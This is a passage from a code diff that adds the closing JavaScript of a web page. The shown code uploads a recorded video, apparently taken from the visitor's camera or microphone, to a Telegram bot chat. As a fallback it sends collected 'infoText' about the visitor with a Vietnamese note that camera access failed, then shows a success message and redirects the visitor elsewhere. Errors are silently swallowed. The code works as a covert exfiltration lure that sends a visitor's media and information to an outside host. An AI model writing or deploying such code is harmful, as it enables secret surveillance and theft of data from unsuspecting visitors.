+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd2 });
+            hasSent = true;
+          } catch(e){}
+        }
+    
+        if (!hasSent) {
+          try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText + '\n\n⚠️ (Không thể quay video hoặc truy cập camera/microphone)', parse_mode: 'HTML', disable_web_page_preview: true })
+            });
+          } catch (e) {}
+        }
+    
+        statusDiv.textContent = '[+] Thành công! Đang chuyển hướng...';
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 1000);
+      }
     </script>
   </body>
 </html>
